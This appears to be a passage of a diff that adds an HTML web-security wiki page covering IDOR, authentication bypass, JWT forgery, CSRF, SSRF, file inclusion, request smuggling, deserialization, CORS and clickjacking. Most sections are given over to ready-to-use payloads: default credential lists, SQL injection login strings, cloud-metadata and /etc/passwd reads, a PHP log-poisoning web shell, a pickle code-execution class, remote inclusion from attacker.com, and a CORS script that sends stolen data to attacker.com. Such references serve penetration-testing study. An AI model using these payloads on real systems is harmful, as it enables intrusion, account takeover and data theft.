+<tr><th>Attribute</th><th>Value</th></tr>
+<tr><td>CWE</td><td>CWE-639: Authorization Bypass Through User-Controlled Key</td></tr>
+<tr><td>Severity</td><td><span class="severity-high">HIGH</span></td></tr>
+<tr><td>Impact</td><td>Unauthorized access to other users' data, PII exposure, account takeover</td></tr>
+</table>
+
+<h3 class="sub-heading">Description</h3>
+<p>IDOR occurs when an application provides direct access to objects based on user-supplied input without verifying the requesting user is authorized to access the object. The vulnerability is named for "direct object references" — when internal object identifiers (database IDs, filenames, keys) are exposed and used directly in API calls or URLs.</p>
+
+<h3 class="sub-heading">How to Find</h3>
+<div class="hack-box">
+<div class="hack-box-title">Detection Methodology</div>
+<ol>
+<li><strong>Map all object references</strong> — Find every URL, API call, and form that references a specific resource (user ID, document ID, order number, file name).</li>
+<li><strong>Create two accounts</strong> — An "attacker" account and a "victim" account.</li>
+<li><strong>Swap the reference</strong> — While logged in as the attacker, change the object ID to the victim's ID.</li>
+<li><strong>Observe the response</strong> — If you can access the victim's data without authorization, IDOR is confirmed.</li>
+<li><strong>Test numeric, UUID, and encoded IDs</strong> — Try incrementing numbers, sequential UUIDs, Base64-encoded values, and encrypted tokens.</li>
+</ol>
+</div>
+
+<h3 class="sub-heading">When It Occurs</h3>
+<ul>
+<li>Profile pages: <code>/user/1001</code> → <code>/user/1002</code></li>
+<li>API endpoints: <code>/api/invoice/INV-001</code> → <code>/INV-002</code></li>
+<li>File downloads: <code>/download?file=report_abc.pdf</code></li>
+<li>Order history: <code>/order/12345</code></li>
+<li>Document access: <code>/doc?id=a1b2c3</code></li>
+</ul>
+
+<h3 class="sub-heading">Exploitation</h3>
+<pre><code>-- Simple ID increment
+GET /api/user/1001 → GET /api/user/1002
+
+-- UUID prediction (if time-based)
+GET /api/user/550e8400-e29b-41d4-a716-446655440000
+
+-- Base64 encoded IDs
+eyJ1c2VyX2lkIjoxMDAxfQ==  →  {"user_id":1001}
+eyJ1c2VyX2lkIjoxMDAyfQ==  →  {"user_id":1002}
+
+-- Sequential document IDs
+GET /api/document/DOC-001 → DOC-002, DOC-003...
+
+-- Parameter manipulation
+GET /profile?user_id=1001 → user_id=1002
+POST /api/get-invoice {"invoice_id": "12345"} → {"invoice_id": "12346"}</code></pre>
+</div>
+
+<!-- ███████████████████████████████████████████████████████████████ -->
+<!-- VULNERABILITY 7: AUTH BYPASS -->
+<!-- ███████████████████████████████████████████████████████████████ -->
+<div class="vuln-section" id="auth" data-search="authentication bypass login admin default credentials password reset 2fa bypass brute force">
+<div class="vuln-id">CWE-287 · CVSS 9.1 Critical</div>
+<h2 class="section-heading">7. Authentication Bypass</h2>
+
+<table class="wiki-table">
+<tr><th>Attribute</th><th>Value</th></tr>
+<tr><td>CWE</td><td>CWE-287: Improper Authentication</td></tr>
+<tr><td>Severity</td><td><span class="severity-critical">CRITICAL</span></td></tr>
+<tr><td>Impact</td><td>Full account takeover, admin access, data breach</td></tr>
+</table>
+
+<h3 class="sub-heading">Description</h3>
+<p>Authentication bypass encompasses any flaw that allows an attacker to access protected resources without valid credentials. This includes direct bypass of login mechanisms, exploiting default credentials, insecure password reset flows, and bypassing multi-factor authentication.</p>
+
+<h3 class="sub-heading">Exploitation</h3>
+<pre><code>-- Default credentials
+admin:admin
+admin:password
+root:root
+administrator:administrator
+test:test
+guest:guest
+
+-- SQLi in login
+Username: admin'--
+Password: anything
+
+-- Forced browsing to admin
+/admin  /wp-admin  /administrator  /console
+/admin/login  /manage  /dashboard
+
+-- Password reset poisoning
+# Intercept password reset request
+# Add header: X-Forwarded-Host: attacker.com
+# Reset link sent to attacker's domain
+
+-- 2FA bypass
+# Complete login → reach 2FA page
+# Try going directly to /dashboard (skip 2FA step)
+# Remove 2FA code parameter from request
+# Try old session cookies from before 2FA was enabled
+
+-- Response manipulation
+# If response says "Invalid credentials" with status 401
+# Change response to {"success": true, "role": "admin"} in Burp
+# (works only if client-side auth checks)</code></pre>
+</div>
+
+<!-- ███████████████████████████████████████████████████████████████ -->
+<!-- VULNERABILITY 8: JWT -->
+<!-- ███████████████████████████████████████████████████████████████ -->
+<div class="vuln-section" id="jwt" data-search="jwt json web token attack none algorithm hs256 rs256 key confusion forgery">
+<div class="vuln-id">CWE-347 · CVSS 8.1 High</div>
+<h2 class="section-heading">8. JWT Attacks</h2>
+
+<table class="wiki-table">
+<tr><th>Attribute</th><th>Value</th></tr>
+<tr><td>CWE</td><td>CWE-347: Improper Verification of Cryptographic Signature</td></tr>
+<tr><td>Severity</td><td><span class="severity-high">HIGH</span></td></tr>
+<tr><td>Impact</td><td>Account takeover, privilege escalation, impersonation</td></tr>
+</table>
+
+<h3 class="sub-heading">Description</h3>
+<p>JSON Web Tokens (JWT) are used for authentication and authorization. JWT attacks exploit weaknesses in how tokens are signed, validated, or structured. Common attacks include the "none" algorithm bypass, key confusion (RS256→HS256), and weak signing keys.</p>
+
+<h3 class="sub-heading">Exploitation</h3>
+<pre><code>-- 1. None algorithm bypass
+# Change header: {"alg":"none"}
+# Remove signature entirely
+# Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
+
+-- 2. Algorithm confusion (RS256 → HS256)
+# If server uses RS256 (public key), sign with HS256 using the PUBLIC KEY as the secret
+# jwt_tool.py -t TOKEN -X k -pk public.pem
+
+-- 3. Weak secret brute force
+# Try common secrets: secret, password, key, jwt_secret
+hashcat -m 16500 jwt.txt wordlist.txt
+jwt_tool.py -t TOKEN -C -d wordlist.txt
+
+-- 4. JKU/JWK injection
+# If token uses jku (JWK Set URL), point it to your server
+# Host your own JWK set and sign with your private key
+
+-- 5. Kid parameter injection
+# If token has "kid" parameter:
+# "kid":"../../dev/null"  (bypass signature check)
+# "kid":"' OR 1=1--"  (SQLi in kid)
+
+-- 6. Claim manipulation
+# Decode token → change {"role":"user"} to {"role":"admin"}
+# Re-encode and send</code></pre>
+
+<div class="tip-box"><strong>Tools:</strong> jwt_tool, jwt_cracker, Burp JWT Editor extension</div>
+</div>
+<!-- ███████████████████████████████████████████████████████████████ -->
+<!-- VULNERABILITY 9: SESSION FIXATION -->
+<!-- ███████████████████████████████████████████████████████████████ -->
+<div class="vuln-section" id="session" data-search="session fixation hijacking cookie session token prediction">
+<div class="vuln-id">CWE-384 · CVSS 6.8 Medium</div>
+<h2 class="section-heading">9. Session Fixation</h2>
+
+<table class="wiki-table">
+<tr><th>Attribute</th><th>Value</th></tr>
+<tr><td>CWE</td><td>CWE-384: Session Fixation</td></tr>
+<tr><td>Severity</td><td><span class="severity-medium">MEDIUM</span></td></tr>
+<tr><td>Impact</td><td>Account takeover, session hijacking</td></tr>
+</table>
+
+<h3 class="sub-heading">Description</h3>
+<p>Session fixation occurs when an application does not regenerate the session ID after authentication. An attacker can set a known session ID for a victim (via URL parameter, cookie injection, or XSS), wait for the victim to authenticate, then use the known session ID to hijack their session.</p>
+
+<h3 class="sub-heading">How to Find</h3>
+<ol>
+<li><strong>Note session ID before login</strong> — Record the session cookie value.</li>
+<li><strong>Login and check</strong> — After authentication, check if the session cookie changed.</li>
+<li><strong>If unchanged</strong> — Session fixation exists. Set the cookie before victim logs in, hijack after.</li>
+</ol>
+
+<h3 class="sub-heading">Exploitation</h3>
+<pre><code>-- Step 1: Get a session ID (e.g., from visiting the site)
+Session-ID: abc123
+
+-- Step 2: Force victim to use this session ID
+https://target.com/login?sessionid=abc123
+Or: Set cookie via XSS
+document.cookie = "session=abc123"
+
+-- Step 3: Victim logs in with the attacker's session ID
+
+-- Step 4: Attacker uses session ID abc123 to access victim's account</code></pre>
+</div>
+
+<!-- ███████████████████████████████████████████████████████████████ -->
+<!-- VULNERABILITY 10: CSRF -->
+<!-- ███████████████████████████████████████████████████████████████ -->
+<div class="vuln-section" id="csrf" data-search="csrf cross-site request forgery token state change password email transfer">
+<div class="vuln-id">CWE-352 · CVSS 8.8 High</div>
+<h2 class="section-heading">10. Cross-Site Request Forgery (CSRF)</h2>
+
+<table class="wiki-table">
+<tr><th>Attribute</th><th>Value</th></tr>
+<tr><td>CWE</td><td>CWE-352: Cross-Site Request Forgery</td></tr>
+<tr><td>Severity</td><td><span class="severity-high">HIGH</span></td></tr>
+<tr><td>Impact</td><td>Unauthorized state changes, account takeover, financial fraud</td></tr>
+</table>
+
+<h3 class="sub-heading">Description</h3>
+<p>CSRF tricks a victim's browser into making unintended requests to a site where they're authenticated. Because browsers automatically include cookies with requests, the target server cannot distinguish between a legitimate user action and a forged request.</p>
+
+<h3 class="sub-heading">How to Find</h3>
+<ol>
+<li><strong>Find state-changing actions</strong> — Password change, email change, transfer, settings update, delete account.</li>
+<li><strong>Check for CSRF tokens</strong> — Does the request include a random, unpredictable token? Is it validated server-side?</li>
+<li><strong>Test token removal</strong> — Remove the CSRF token from the request. If it succeeds, CSRF exists.</li>
+<li><strong>Test same-origin checks</strong> — Does the server check Origin/Referer headers?</li>
+</ol>
+
+<h3 class="sub-heading">Exploitation</h3>
+<pre><code>&lt;!-- Auto-submit form to change email --&gt;
+&lt;html&gt;
+&lt;body&gt;
+  &lt;form method="POST" action="https://target.com/change-email"&gt;
+    &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+    &lt;input type="submit" value="Click me"&gt;
+  &lt;/form&gt;
+  &lt;script&gt;document.forms[0].submit();&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+&lt;!-- Image tag CSRF (GET-based actions) --&gt;
+&lt;img src="https://target.com/api/delete-account?confirm=true" style="display:none"&gt;
+
+&lt;!-- XHR-based CSRF --&gt;
+&lt;script&gt;
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "https://target.com/change-email", true);
+xhr.withCredentials = true;
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xhr.send("email=attacker@evil.com");
+&lt;/script&gt;</code></pre>
+</div>
+
+<!-- ███████████████████████████████████████████████████████████████ -->
+<!-- VULNERABILITY 11: PRIVILEGE ESCALATION -->
+<!-- ███████████████████████████████████████████████████████████████ -->
+<div class="vuln-section" id="privesc" data-search="privilege escalation horizontal vertical admin role elevation">
+<div class="vuln-id">CWE-269 · CVSS 8.8 High</div>
+<h2 class="section-heading">11. Privilege Escalation</h2>
+
+<table class="wiki-table">
+<tr><th>Attribute</th><th>Value</th></tr>
+<tr><td>CWE</td><td>CWE-269: Improper Privilege Management</td></tr>
+<tr><td>Severity</td><td><span class="severity-high">HIGH</span></td></tr>
+<tr><td>Impact</td><td>Admin access, data breach, full system compromise</td></tr>
+</table>
+
+<h3 class="sub-heading">Description</h3>
+<p>Privilege escalation is the act of gaining elevated access from a lower-privilege position. <em>Horizontal</em> escalation accesses resources of other users at the same level. <em>Vertical</em> escalation accesses resources of higher-privilege users (admin, root).</p>
+
+<h3 class="sub-heading">How to Find</h3>
+<ol>
+<li><strong>Map role-based endpoints</strong> — Find admin panels, management interfaces, API endpoints.</li>
+<li><strong>Test parameter manipulation</strong> — Change role parameters, user types, or access levels in requests.</li>
+<li><strong>Check for missing authorization</strong> — Access admin endpoints while logged in as a regular user.</li>
+<li><strong>Inspect JWT/cookies</strong> — Modify role claims in tokens.</li>
+</ol>
+
+<h3 class="sub-heading">Exploitation</h3>
+<pre><code>-- Parameter manipulation
+POST /api/update-profile
+{"role": "user"} → {"role": "admin"}
+
+-- Header manipulation
+X-Forwarded-For: 127.0.0.1
+X-Original-URL: /admin
+X-Custom-IP-Authorization: 127.0.0.1
+
+-- Direct admin access
+GET /admin/dashboard
+GET /api/admin/users
+GET /manage
+
+-- Mass assignment
+POST /api/register
+{"username":"hacker","password":"pass","role":"admin","is_admin":true}</code></pre>
+</div>
+
+<!-- ███████████████████████████████████████████████████████████████ -->
+<!-- VULNERABILITY 12: RBAC BYPASS -->
+<!-- ███████████████████████████████████████████████████████████████ -->
+<div class="vuln-section" id="rbac" data-search="rbac role based access control bypass api authorization broken access">
+<div class="vuln-id">CWE-863 · CVSS 8.1 High</div>
+<h2 class="section-heading">12. RBAC Bypass (Broken Access Control)</h2>
+
+<table class="wiki-table">
+<tr><th>Attribute</th><th>Value</th></tr>
+<tr><td>CWE</td><td>CWE-863: Incorrect Authorization</td></tr>
+<tr><td>Severity</td><td><span class="severity-high">HIGH</span></td></tr>
+<tr><td>Impact</td><td>Unauthorized access to admin functions, data breach</td></tr>
+</table>
+
+<h3 class="sub-heading">Description</h3>
+<p>RBAC bypass exploits flaws in Role-Based Access Control implementations. Even when roles and permissions are defined, the enforcement may be incomplete — missing checks on certain endpoints, client-side-only role checks, or inconsistent authorization across API versions.</p>
+
+<h3 class="sub-heading">Exploitation</h3>
+<pre><code>-- HTTP method override
+GET /api/admin/users → 403 Forbidden
+PUT /api/admin/users → 200 OK (different authorization check)
+
+-- Parameter pollution
+GET /api/users?role=admin&role=user (server uses first param)
+
+-- API version bypass
+/api/v1/admin  → 403
+/api/v2/admin  → 200 (newer version, missing check)
+
+-- Path traversal in authorization
+/api/users/../admin/dashboard
+/api/users/./admin/settings
+
+-- GraphQL introspection
+POST /graphql
+{"query": "{__schema{types{name,fields{name}}}}"}
+# Discover hidden admin queries/mutations</code></pre>
+</div>
+<!-- ███████████████████████████████████████████████████████████████ -->
+<!-- VULNERABILITY 13: SSRF -->
+<!-- ███████████████████████████████████████████████████████████████ -->
+<div class="vuln-section" id="ssrf" data-search="ssrf server side request forgery internal network cloud metadata localhost 127.0.0.1">
+<div class="vuln-id">CWE-918 · CVSS 9.1 Critical</div>
+<h2 class="section-heading">13. Server-Side Request Forgery (SSRF)</h2>
+
+<table class="wiki-table">
+<tr><th>Attribute</th><th>Value</th></tr>
+<tr><td>CWE</td><td>CWE-918: Server-Side Request Forgery</td></tr>
+<tr><td>Severity</td><td><span class="severity-critical">CRITICAL</span></td></tr>
+<tr><td>Impact</td><td>Internal network scanning, cloud credential theft, file read, RCE</td></tr>
+</table>
+
+<h3 class="sub-heading">Description</h3>
+<p>SSRF forces the server to make HTTP requests to arbitrary destinations. Since the request originates from the server, it can access internal resources (databases, admin panels, cloud metadata APIs) that are not exposed to the internet. SSRF is the gateway to cloud metadata exploitation and internal network pivoting.</p>
+
+<h3 class="sub-heading">How to Find</h3>
+<div class="hack-box">
+<div class="hack-box-title">Detection Methodology</div>
+<ol>
+<li><strong>Set up listener</strong> — Use webhook.site or <code>nc -lvnp 8080</code></li>
+<li><strong>Find URL inputs</strong> — Import from URL, image proxy, PDF generation, webhook callbacks, link preview/unfurling.</li>
+<li><strong>Submit your listener URL</strong> — If a request appears on your listener, SSRF confirmed.</li>
+<li><strong>Test internal addresses</strong> — <code>http://127.0.0.1</code>, <code>http://localhost</code>, <code>http://[::1]</code></li>
+<li><strong>Bypass filters</strong> — Decimal IP (<code>2130706433</code>), IPv6 (<code>[::1]</code>), URL encoding, DNS rebinding.</li>
+</ol>
+</div>
+
+<h3 class="sub-heading">Exploitation Payloads</h3>
+<pre><code>-- Internal addresses
+http://127.0.0.1
+http://localhost
+http://0.0.0.0
+http://[::1]
+http://127.0.0.1:8080
+http://127.0.0.1:3000
+http://127.0.0.1:6379  (Redis)
+
+-- Filter bypasses
+http://127.1
+http://0177.0.0.1  (octal)
+http://2130706433  (decimal)
+http://0x7f.0x00.0x00.0x01  (hex)
+http://127.0.0.1.nip.io  (DNS)
+http://127.0.0.1%2523.attacker.com  (URL encoding)
+
+-- Cloud metadata
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+-- File read via SSRF
+file:///etc/passwd
+file:///proc/self/environ
+file:///c:/windows/win.ini
+
+-- Internal services
+http://127.0.0.1:8080/admin
+http://127.0.0.1:3000/api/internal
+http://127.0.0.1:9200/_cat/indices  (Elasticsearch)</code></pre>
+</div>
+
+<!-- ███████████████████████████████████████████████████████████████ -->
+<!-- VULNERABILITY 14: LFI/RFI -->
+<!-- ███████████████████████████████████████████████████████████████ -->
+<div class="vuln-section" id="lfi" data-search="lfi rfi local file inclusion remote file inclusion path traversal directory traversal ../">
+<div class="vuln-id">CWE-98 · CVSS 8.6 High</div>
+<h2 class="section-heading">14. Local/Remote File Inclusion (LFI/RFI)</h2>
+
+<table class="wiki-table">
+<tr><th>Attribute</th><th>Value</th></tr>
+<tr><td>CWE</td><td>CWE-98: Improper Control of Filename for Include/Require Statement</td></tr>
+<tr><td>Severity</td><td><span class="severity-high">HIGH</span></td></tr>
+<tr><td>Impact</td><td>Sensitive file read, code execution, RFI = remote code execution</td></tr>
+</table>
+
+<h3 class="sub-heading">Description</h3>
+<p>LFI/RFI vulnerabilities occur when an application includes files based on user input without proper validation. LFI reads local files from the server. RFI includes files from remote URLs, which often leads to direct code execution.</p>
+
+<h3 class="sub-heading">Exploitation Payloads</h3>
+<pre><code>-- Basic traversal
+../../../../etc/passwd
+..%2f..%2f..%2fetc/passwd  (URL encoding)
+....//....//....//etc/passwd  (double encoding bypass)
+
+-- Null byte (older PHP)
+../../../../etc/passwd%00
+
+-- PHP wrappers
+php://filter/convert.base64-encode/resource=index.php
+php://input  (POST body as code)
+php://expect://command
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs=
+
+-- Log poisoning (inject PHP into logs, then include log)
+# Send User-Agent: &lt;?php system($_GET['c']); ?&gt;
+# Then: ?page=../../../../var/log/apache2/access.log&c=whoami
+
+-- Windows files
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\win.ini
+C:\Windows\System32\config\SAM
+
+-- RFI (if enabled)
+http://attacker.com/shell.txt
+http://attacker.com/shell.txt%00
+http://attacker.com/shell.txt?.php</code></pre>
+</div>
+
+<!-- ███████████████████████████████████████████████████████████████ -->
+<!-- VULNERABILITY 15: REQUEST SMUGGLING -->
+<!-- ███████████████████████████████████████████████████████████████ -->
+<div class="vuln-section" id="desync" data-search="request smuggling desync http pipeline cl te te cl transfer encoding content length">
+<div class="vuln-id">CWE-444 · CVSS 9.1 Critical</div>
+<h2 class="section-heading">15. HTTP Request Smuggling</h2>
+
+<table class="wiki-table">
+<tr><th>Attribute</th><th>Value</th></tr>
+<tr><td>CWE</td><td>CWE-444: Inconsistent Interpretation of HTTP Requests</td></tr>
+<tr><td>Severity</td><td><span class="severity-critical">CRITICAL</span></td></tr>
+<tr><td>Impact</td><td>Request hijacking, cache poisoning, XSS, credential theft, firewall bypass</td></tr>
+</table>
+
+<h3 class="sub-heading">Description</h3>
+<p>HTTP Request Smuggling exploits discrepancies in how front-end (proxy/CDN) and back-end servers parse HTTP request boundaries. When two servers disagree on where one request ends and the next begins, an attacker can "smuggle" a request that the front-end doesn't see but the back-end processes.</p>
+
+<h3 class="sub-heading">Types</h3>
+<ul>
+<li><strong>CL.TE</strong> — Front-end uses Content-Length, back-end uses Transfer-Encoding</li>
+<li><strong>TE.CL</strong> — Front-end uses Transfer-Encoding, back-end uses Content-Length</li>
+<li><strong>TE.TE</strong> — Both use Transfer-Encoding but parse it differently</li>
+</ul>
+
+<h3 class="sub-heading">Exploitation</h3>
+<pre><code>-- CL.TE Attack
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G
+
+-- TE.CL Attack
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0</code></pre>
+
+<div class="tip-box"><strong>Tools:</strong> smuggler.py, HTTP Request Smuggler (Burp extension), h2c-smuggler</div>
+</div>
+<!-- ███████████████████████████████████████████████████████████████ -->
+<!-- VULNERABILITY 16: DESERIALIZATION -->
+<!-- ███████████████████████████████████████████████████████████████ -->
+<div class="vuln-section" id="deserial" data-search="deserialization insecure java php python pickle java unserialize rce gadget chain">
+<div class="vuln-id">CWE-502 · CVSS 9.8 Critical</div>
+<h2 class="section-heading">16. Insecure Deserialization</h2>
+
+<table class="wiki-table">
+<tr><th>Attribute</th><th>Value</th></tr>
+<tr><td>CWE</td><td>CWE-502: Deserialization of Untrusted Data</td></tr>
+<tr><td>Severity</td><td><span class="severity-critical">CRITICAL</span></td></tr>
+<tr><td>Impact</td><td>Remote code execution, replay attacks, privilege escalation</td></tr>
+</table>
+
+<h3 class="sub-heading">Description</h3>
+<p>Deserialization vulnerabilities occur when an application deserializes untrusted data without validation. If the application uses a language's native serialization (Java ObjectInputStream, PHP unserialize, Python pickle), an attacker can craft malicious serialized objects that execute arbitrary code when deserialized.</p>
+
+<h3 class="sub-heading">How to Find</h3>
+<ol>
+<li><strong>Identify serialized data</strong> — Look for Base64-encoded strings, tokens, or cookies that decode to binary/structured data.</li>
+<li><strong>Test manipulation</strong> — Modify the serialized data and observe the application's behavior.</li>
+<li><strong>Check for known gadget chains</strong> — Use ysoserial (Java), phpggc (PHP) to generate payloads.</li>
+</ol>
+
+<h3 class="sub-heading">Exploitation</h3>
+<pre><code>-- Java (ysoserial)
+java -jar ysoserial.jar CommonsCollections1 "whoami" | base64
+# Send the Base64 payload in cookie/token/parameter
+
+-- PHP (phpggc)
+./phpggc Laravel/RCE1 system "id"
+php -r 'echo base64_encode(serialize(new ...));'
+
+-- Python pickle (if you can inject serialized data)
+import pickle, os, base64
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ('whoami',))
+print(base64.b64encode(pickle.dumps(Exploit())))
+
+-- Ruby
+Marshal.dump(STDIN.gets)
+# Or use universal deserializr payloads
+
+-- Node.js (node-serialize)
+# Cookie: cookie=eyJyIjp7InR5cGUiOiJjb29raWUiLCJkYXRhIjoiY29tbWFuZCJ9fQ==
+# Modify to inject IIFE payload</code></pre>
+
+<div class="tip-box"><strong>Tools:</strong> ysoserial (Java), phpggc (PHP), JNDIExploit, GadgetInspector</div>
+</div>
+
+<!-- ███████████████████████████████████████████████████████████████ -->
+<!-- VULNERABILITY 17: OPEN REDIRECT -->
+<!-- ███████████████████████████████████████████████████████████████ -->
+<div class="vuln-section" id="openredirect" data-search="open redirect url redirect phishing oauth token theft">
+<div class="vuln-id">CWE-601 · CVSS 6.1 Medium</div>
+<h2 class="section-heading">17. Open Redirect</h2>
+
+<table class="wiki-table">
+<tr><th>Attribute</th><th>Value</th></tr>
+<tr><td>CWE</td><td>CWE-601: URL Redirection to Untrusted Site</td></tr>
+<tr><td>Severity</td><td><span class="severity-medium">MEDIUM</span></td></tr>
+<tr><td>Impact</td><td>Phishing, OAuth token theft, malware distribution</td></tr>
+</table>
+
+<h3 class="sub-heading">Description</h3>
+<p>An open redirect allows an attacker to redirect a victim from a trusted domain to an arbitrary external URL. This is exploited in phishing attacks (trusted link → fake login page) and OAuth token theft (redirect_uri manipulation).</p>
+
+<h3 class="sub-heading">How to Find</h3>
+<ol>
+<li><strong>Find redirect parameters</strong> — <code>?redirect=</code>, <code>?next=</code>, <code>?url=</code>, <code>?return=</code>, <code>?dest=</code>, <code>?goto=</code>, <code>?continue=</code>, <code>?redir=</code></li>
+<li><strong>Change value to external URL</strong> — Set to <code>https://evil.com</code></li>
+<li><strong>Test bypasses</strong> — Subdomain tricks, protocol changes, URL encoding</li>
+</ol>
+
+<h3 class="sub-heading">Exploitation Payloads</h3>
+<pre><code>-- Basic
+https://evil.com
+//evil.com
+
+-- Protocol-relative
+//evil.com%00.victim.com
+
+-- Subdomain tricks
+https://victim.com.evil.com
+https://evil.com#victim.com
+https://evil.com?victim.com
+
+-- URL encoding
+https://evil%2Ecom
+https://%65vil.com
+
+-- Parameter pollution
+?redirect=https://victim.com&redirect=https://evil.com</code></pre>
+
+<h3 class="sub-heading">High-Impact Uses</h3>
+<ul>
+<li><strong>OAuth token theft</strong> — Redirect OAuth callback to attacker-controlled domain, capturing the authorization code/token</li>
+<li><strong>Phishing</strong> — Trusted domain link redirects to fake login page</li>
+<li><strong>Filter bypass</strong> — Bypass email link validation, password reset poisoning</li>
+</ul>
+</div>
+
+<!-- ███████████████████████████████████████████████████████████████ -->
+<!-- VULNERABILITY 18: CORS -->
+<!-- ███████████████████████████████████████████████████████████████ -->
+<div class="vuln-section" id="cors" data-search="cors cross-origin resource sharing misconfiguration reflected origin wildcard credential">
+<div class="vuln-id">CWE-942 · CVSS 6.1 Medium → 8.1 High</div>
+<h2 class="section-heading">18. CORS Misconfiguration</h2>
+
+<table class="wiki-table">
+<tr><th>Attribute</th><th>Value</th></tr>
+<tr><td>CWE</td><td>CWE-942: Overly Permissive Cross-domain Whitelist</td></tr>
+<tr><td>Severity</td><td><span class="severity-high">HIGH</span> (if credentials allowed)</td></tr>
+<tr><td>Impact</td><td>Data theft, account takeover, sensitive information exposure</td></tr>
+</table>
+
+<h3 class="sub-heading">Description</h3>
+<p>CORS (Cross-Origin Resource Sharing) is a browser security mechanism. When misconfigured, it allows malicious websites to make authenticated requests to the target API and read the responses. The most dangerous misconfiguration is reflecting the Origin header back in Access-Control-Allow-Origin with Access-Control-Allow-Credentials: true.</p>
+
+<h3 class="sub-heading">How to Find</h3>
+<ol>
+<li><strong>Send request with custom Origin</strong> — Add <code>Origin: https://evil.com</code></li>
+<li><strong>Check response headers</strong> — If <code>Access-Control-Allow-Origin: https://evil.com</code> and <code>Access-Control-Allow-Credentials: true</code> → vulnerable</li>
+<li><strong>Test null origin</strong> — <code>Origin: null</code> (works from sandboxed iframes)</li>
+<li><strong>Test subdomain matching</strong> — <code>Origin: https://evil.target.com</code></li>
+</ol>
+
+<h3 class="sub-heading">Exploitation</h3>
+<pre><code>&lt;!-- Steal data via CORS --&gt;
+&lt;script&gt;
+var req = new XMLHttpRequest();
+req.open("GET", "https://target.com/api/user/data", true);
+req.withCredentials = true;
+req.onreadystatechange = function() {
+  if (req.readyState == 4) {
+    fetch("https://attacker.com/steal?data=" + encodeURIComponent(req.responseText));
+  }
+};
+req.send();
+&lt;/script&gt;
+
+-- Null origin bypass (from sandboxed iframe)
+&lt;iframe sandbox="allow-scripts" src="data:text/html,&lt;script&gt;...&lt;/script&gt;"&gt;&lt;/iframe&gt;
+# Origin will be "null" — some servers allow it</code></pre>
+</div>
+<!-- ███████████████████████████████████████████████████████████████ -->
+<!-- VULNERABILITY 19: CLICKJACKING -->
+<!-- ███████████████████████████████████████████████████████████████ -->
+<div class="vuln-section" id="clickjack" data-search="clickjacking uiframing frame injection ui redressing x-frame-options">
+<div class="vuln-id">CWE-1021 · CVSS 6.1 Medium</div>
+<h2 class="section-heading">19. Clickjacking</h2>
+
+<table class="wiki-table">
+<tr><th>Attribute</th><th>Value</th></tr>
+<tr><td>CWE</td><td>CWE-1021: Improper Restriction of Rendered UI Layers</td></tr>
+<tr><td>Severity</td><td><span class="severity-medium">MEDIUM</span></td></tr>
+<tr><td>Impact</td><td>Unintended actions, account deletion, settings changes, financial transactions</td></tr>
+</table>
+
+<h3 class="sub-heading">Description</h3>
+<p>Clickjacking (UI Redressing) tricks users into clicking on hidden elements by embedding the target site in an opaque or transparent iframe. The user thinks they're clicking something on the attacker's page but are actually clicking buttons on the hidden target site.</p>
+
+<h3 class="sub-heading">How to Find</h3>
+<ol>
+<li><strong>Check X-Frame-Options header</strong> — If missing, the site may be frameable</li>
+<li><strong>Check Content-Security-Policy frame-ancestors</strong> — If missing, clickjacking is possible</li>
+<li><strong>Test with PoC HTML</strong> — Embed the target in an iframe with opacity:0</li>
+</ol>
+
+<h3 class="sub-heading">Exploitation</h3>
+<pre><code>&lt;html&gt;
+&lt;style&gt;
+  iframe {
+    position: relative;
+    width: 700px;
+    height: 500px;
+    opacity: 0.0001;
+    z-index: 2;
+  }
+  .decoy {
+    position: absolute;
+    top: 225px;
+    left: 100px;
+    z-index: 1;
+  }
+&lt;/style&gt;
+&lt;body&gt;
+  &lt;div class="decoy"&gt;Click here to win a prize!&lt;/div&gt;
+  &lt;iframe src="https://target.com/delete-account"&gt;&lt;/iframe&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+<h3 class="sub-heading">Remediation</h3>
+<ul>
+<li><strong>X-Frame-Options: DENY</strong> — Prevent all framing</li>
+<li><strong>Content-Security-Policy: frame-ancestors 'none'</strong> — Modern replacement</li>
+<li><strong>frame-ancestors 'self'</strong> — Allow framing from same origin only</li>
+</ul>
+</div>
+
+<!-- ███████████████████████████████████████████████████████████████ -->
+<!-- VULNERABILITY 20: INFO DISCLOSURE -->
+<!-- ███████████████████████████████████████████████████████████████ -->
+<div class="vuln-section" id="infodisc" data-search="information disclosure sensitive files exposed data backup debug error stack trace git env config backup">
+<div class="vuln-id">CWE-200 · CVSS 5.3 Medium → 7.5 High</div>
+<h2 class="section-heading">20. Information Disclosure</h2>
+
+<table class="wiki-table">
+<tr><th>Attribute</th><th>Value</th></tr>
+<tr><td>CWE</td><td>CWE-200: Exposure of Sensitive Information</td></tr>
+<tr><td>Severity</td><td><span class="severity-medium">MEDIUM</span> – <span class="severity-high">HIGH</span></td></tr>
+<tr><td>Impact</td><td>Credential theft, source code exposure, internal architecture mapping</td></tr>
+</table>
+
+<h3 class="sub-heading">Description</h3>
+<p>Information disclosure occurs when an application exposes sensitive data that should be protected — configuration files, source code, debug information, stack traces, backup files, or internal paths. This data can be used to facilitate further attacks.</p>
+
+<h3 class="sub-heading">How to Find</h3>
+<div class="hack-box">
+<div class="hack-box-title">Files to Check</div>
+<pre><code>https://target.com/robots.txt
+https://target.com/.git/config
+https://target.com/.env
+https://target.com/.DS_Store
+https://target.com/web.config
+https://target.com/sitemap.xml
+https://target.com/server-status
+https://target.com/phpinfo.php
+https://target.com/backup.zip
+https://target.com/.htaccess
+https://target.com/debug
+https://target.com/api/
+https://target.com/graphql
+https://target.com/.well-known/
+https://target.com/crossdomain.xml
+https://target.com/clientaccesspolicy.xml</code></pre>
+</div>
+
+<h3 class="sub-heading">What to Look For</h3>
+<ul>
+<li><strong>robots.txt</strong> — Disallowed paths reveal hidden admin areas</li>
